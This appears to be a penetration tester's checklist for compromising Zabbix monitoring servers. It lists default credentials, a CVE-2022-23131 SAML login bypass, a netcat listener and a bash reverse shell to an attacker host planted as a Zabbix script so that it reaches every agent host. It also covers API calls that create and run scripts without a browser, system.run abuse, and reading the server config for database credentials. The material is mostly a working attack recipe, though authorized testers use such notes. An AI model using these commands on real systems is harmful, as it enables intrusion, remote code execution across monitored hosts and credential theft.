# Zabbix

## Before I start
- [ ] The web interface at /zabbix/, with the agent on 10050 and the server on 10051 in the scan
- [ ] The default login, Admin with zabbix, capital A; and Sign in as guest, which is read-only but shows hosts and versions

## CVE-2022-23131, with SAML sign-on
- [ ] SAML configured: the session cookie's SAML data, changed to name Admin, logs in as Admin
searchsploit zabbix

## Commands, with an administrator login
rlwrap nc -lvnp <LPORT>
- [ ] Alerts, Scripts, a new script of type Script that runs on the Zabbix agent, with this as its command:
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
- [ ] Monitoring, Hosts, a host, then the script from its menu
- [ ] The shell is the agent's user on that monitored host: one script reaches every host with an agent

## The same through the API
curl -sk <Scheme>://<WebHost>/zabbix/api_jsonrpc.php -H 'Content-Type: application/json' -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"<Username>","password":"<Password>"},"id":1}'
- [ ] The token it returns calls script.create and script.execute with no browser

## Without an administrator
- [ ] An item with a system.run[] key, on an agent with EnableRemoteCommands=1, runs a command on that agent

## After a shell
cat /etc/zabbix/zabbix_server.conf
- [ ] The database credentials are there; the database holds the host inventory, IPMI credentials and SNMP communities

## Next
- [ ] A shell as zabbix: :Pb linux-enum, :Pb sudo
- [ ] Communities and credentials from the database: :Pb snmp, :Pb spraying
